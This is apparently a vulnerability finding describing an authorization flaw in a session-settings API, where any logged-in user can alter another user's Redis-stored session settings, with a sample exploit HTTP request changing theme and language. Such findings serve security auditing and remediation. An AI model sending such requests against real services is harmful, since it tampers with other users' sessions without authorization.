diagnosis: The endpoint writes UI preference settings directly to the Redis session hash key sess:${sessionId} without verifying that the sessionId belongs to req.user.id. Any authenticated user can modify settings of other active user sessions.
exploit_request:
POST /api/sessions/sess_user_alpha_09/settings HTTP/1.1
Host: app.portal.com
Authorization: Bearer <user_jwt>
Content-Type: application/json

{"theme": "high-contrast", "language": "fr"}
